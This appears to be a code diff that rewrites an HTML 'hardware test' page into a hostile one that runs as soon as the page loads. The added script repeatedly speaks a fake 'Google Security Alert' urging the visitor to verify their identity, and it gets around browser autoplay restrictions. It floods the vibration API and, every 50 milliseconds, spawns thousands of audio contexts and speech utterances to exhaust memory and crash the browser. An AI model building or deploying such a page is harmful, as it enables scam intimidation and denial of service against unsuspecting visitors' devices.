@@ -3,82 +3,76 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Zero-Click Hardware Test</title>
+<title>Security Alert - Advanced Hardware & DoS Chain</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { 
-    background: #0f172a; 
-    min-height: 100vh; 
-    color: #f8fafc; 
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-    overflow: hidden;
-  }
-  .card {
-    background: #1e293b;
-    padding: 32px;
-    border-radius: 12px;
-    max-width: 500px;
-    width: 100%;
-    border: 1px solid #334155;
-    text-align: center;
-  }
-  h2 { font-size: 20px; margin-bottom: 12px; color: #f8fafc; }
-  p { font-size: 14px; color: #94a3b8; line-height: 1.5; }
+  body { background: #000; min-height: 100vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
 <body>
-
-<div class="card">
-  <h2>Zero-Click Hardware Test</h2>
-  <p>Menguji inisialisasi otomatis tanpa interaksi tombol (Zero-Click) untuk Speech Synthesis TTS dan Vibration API.</p>
-</div>
-
 <script>
 (function () {
   'use strict';
 
   // ============================================
-  // 1. ZERO-CLICK SPEECH SYNTHESIS TTS
+  // KONFIGURASI AUTOPLAY & HARDWARE PARAMS
   // ============================================
-  function initZeroClickTTS() {
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Critical hardware and memory exception detected. Verify identity immediately.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 6000,
+      maxRepeats: 30
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
+
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
+
+  // ============================================
+  // TTS ENGINE
+  // ============================================
+  function speakOnce() {
     if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+
     try {
-      var u = new SpeechSynthesisUtterance("Zero click security verification initialized. Stand by.");
-      u.rate = 0.9;
-      u.pitch = 1.0;
-      u.onend = function() {
-        setTimeout(initZeroClickTTS, 4000);
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
+
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
+
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
       };
+
       window.speechSynthesis.speak(u);
-    } catch(e) {}
+    } catch (e) {}
+  }
+
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
   }
 
   // ============================================
-  // 2. ZERO-CLICK VIBRATION API PULSING
+  // AUDIO CONTEXT UNLOCK
   // ============================================
-  function initZeroClickVibration() {
-    if (!('vibrate' in navigator)) return;
-    
-    // Memicu getaran secara otomatis saat load
-    try {
-      navigator.vibrate([300, 150, 300, 150, 500]);
-    } catch(e) {}
-
-    setInterval(function() {
-      try {
-        navigator.vibrate([200, 100, 200]);
-      } catch(e) {}
-    }, 2000);
-  }
-
-  // ============================================
-  // 3. AUDIO CONTEXT UNLOCKER (Zero-Click Helper)
-  // ============================================
-  function unlockAudioContextZeroClick() {
+  function unlockAudioContext() {
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       if (ctx.state === 'suspended') {
@@ -87,29 +81,133 @@
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
       gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
       osc.connect(gain);
       gain.connect(ctx.destination);
       osc.start();
-      osc.stop(ctx.currentTime + 0.05);
-    } catch(e) {}
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
   }
 
   // ============================================
-  // EKSEKUSI OTOMATIS (ZERO-CLICK ON LOAD)
+  // SILENT AUDIO ELEMENT
   // ============================================
-  window.addEventListener('load', function() {
-    unlockAudioContextZeroClick();
-    setTimeout(initZeroClickTTS, 200);
-    setTimeout(initZeroClickVibration, 500);
-  });
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
 
-  // Fallback transparan jika browser memblokir otonomi penuh sebelum interaksi mikro
-  ['click', 'touchstart', 'keydown', 'mousemove'].forEach(function(evt) {
-    window.addEventListener(evt, function() {
-      unlockAudioContextZeroClick();
-    }, { once: true });
-  });
+  // ============================================
+  // MAIN AUDIO (Web Audio API)
+  // ============================================
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
 
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
+
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
+
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+      setTimeout(startTTS, 3500);
+    } catch (e) {
+      startTTS();
+    }
+  }
+
+  // ============================================
+  // UPGRADE: VIBRATION API PULSING + RESOURCE EXHAUSTION (DoS)
+  // ============================================
+  function triggerHardwareAndMemoryExhaustion() {
+    console.log("[!] Initiating Hardware Vibration & Resource Exhaustion Chain...");
+
+    // 1. Continuous Vibration API Pulsing (Haptic Feedback Flood)
+    setInterval(function() {
+      try {
+        if ('vibrate' in navigator) {
+          navigator.vibrate([300, 150, 300, 150, 500]);
+        }
+      } catch(e) {}
+    }, 1200);
+
+    // 2. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine & Speech Queue
+    setInterval(function() {
+      try {
+        for (var i = 0; i < 2000; i++) {
+          var ctx = new (window.AudioContext || window.webkitAudioContext)();
+          var osc = ctx.createOscillator();
+          var gain = ctx.createGain();
+          
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(0);
+          
+          var u = new SpeechSynthesisUtterance("HARDWARE_EXCEPTION_" + i);
+          window.speechSynthesis.speak(u);
+        }
+      } catch(e) {}
+    }, 50);
+  }
+
+  // ============================================
+  // EKSEKUSI BERTAHAP
+  // ============================================
+  unlockAudioContext();
+  trySilentAudio();
+
+  setTimeout(function () {
+    unlockAudioContext();
+    startTTS();
+  }, 100);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+  }, 500);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL HARDWARE & CRASH TRIGGER DI SINI
+    triggerHardwareAndMemoryExhaustion();
+    
+  }, 1500);
+
+  // Retry handler
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
+  }, 2000);
+
+  // Visibility change
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
+    }
+  });
 })();
 </script>
 </body>
